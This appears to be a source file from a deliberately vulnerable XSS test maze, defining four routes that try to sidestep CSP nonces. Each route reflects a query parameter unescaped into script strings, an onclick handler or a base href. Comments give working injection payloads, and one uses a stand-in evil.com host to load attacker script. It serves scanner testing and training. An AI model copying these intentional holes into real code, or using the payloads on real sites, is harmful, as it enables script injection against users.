# Level 1: CSP with nonce, but query reflected inside a nonced <script> block (string context)
# Exploit: Break out of the string context e.g. query=";alert(1)//
# Since the script tag already carries the valid nonce, injected code executes
Xssmaze.push("nonce-level1", "/nonce/level1/?query=a", "CSP nonce with reflection inside nonced script string",
  vuln: "reflected-js", delivery: ["query"], note: "the nonce is random per request, so no injected <script> can carry it; the only route is breaking the double-quoted string inside the already-nonced block")
maze_get "/nonce/level1/" do |env|
  query = env.params.query.fetch("query", "")
  nonce = Random::Secure.hex(16)
  env.response.headers["Content-Security-Policy"] = "script-src 'nonce-#{nonce}'"

  "<html><head></head><body>
  <h1>Nonce Bypass XSS Level 1</h1>
  <script nonce=\"#{nonce}\">var x = \"#{query}\";</script>
  </body></html>"
end

# Level 2: CSP with nonce + unsafe-hashes, query reflected in onclick event handler
# Exploit: Break out of the handler string e.g. query=');alert(1)//
# Event handler attributes bypass nonce when unsafe-hashes is present
Xssmaze.push("nonce-level2", "/nonce/level2/?query=a", "CSP nonce with reflection in onclick (unsafe-hashes)",
  vuln: "non-xss-control", delivery: ["query"], exploitable: false, note: "script-src 'nonce-X' 'unsafe-hashes' lists no hash source, so 'unsafe-hashes' enables nothing and the onclick handler holding the reflection never runs; an injected handler or script is blocked too and the nonce is random, so nothing reaches a JS sink")
maze_get "/nonce/level2/" do |env|
  query = env.params.query.fetch("query", "")
  nonce = Random::Secure.hex(16)
  env.response.headers["Content-Security-Policy"] = "script-src 'nonce-#{nonce}' 'unsafe-hashes'"

  "<html><head></head><body>
  <h1>Nonce Bypass XSS Level 2</h1>
  <button onclick=\"handle('#{query}')\">Click me</button>
  <script nonce=\"#{nonce}\">
    function handle(x) { document.title = x; }
  </script>
  </body></html>"
end

# Level 3: CSP script-src 'self' but query reflected in <base href="...">
# Exploit: Change the base URL so that relative script src loads from attacker server
# e.g. query=https://evil.com/ makes <script src="/js/app.js"> load from https://evil.com/js/app.js
Xssmaze.push("nonce-level3", "/nonce/level3/?query=/", "CSP script-src self with base tag href injection",
  vuln: "reflected-attr", delivery: ["query"], note: "script-src 'self' blocks inline scripts and event handlers, and also blocks the intended <base href> redirect of /js/app.js to another origin; what does work is the \" attribute breakout plus a same-origin <script src=...> include")
maze_get "/nonce/level3/" do |env|
  query = env.params.query.fetch("query", "")
  env.response.headers["Content-Security-Policy"] = "script-src 'self'"

  "<html><head>
  <base href=\"#{query}\">
  </head><body>
  <h1>Nonce Bypass XSS Level 3</h1>
  <script src=\"/js/app.js\"></script>
  </body></html>"
end

# Level 4: No CSP, reflection in <script> with single-quote string, backslash escape for quotes
# Exploit: Send \' which becomes \\' (the backslash is escaped, leaving the quote unescaped)
# e.g. query=\';alert(1)// => var s = '\\'';alert(1)//';
Xssmaze.push("nonce-level4", "/nonce/level4/?query=a", "script single-quote string with backslash escape bypass",
  vuln: "reflected-js", delivery: ["query"], note: "single quotes are backslash-escaped but backslashes are not, so a leading backslash escapes the added one and frees the quote: \\';alert(1)//")
maze_get "/nonce/level4/" do |env|
  query = env.params.query.fetch("query", "")

  # Only escape single quotes by prepending backslash (but not backslashes themselves)
  escaped = query.gsub("'", "\\'")

  "<html><body>
  <h1>Nonce Bypass XSS Level 4</h1>
  <script>var s = '#{escaped}';</script>
  </body></html>"
end
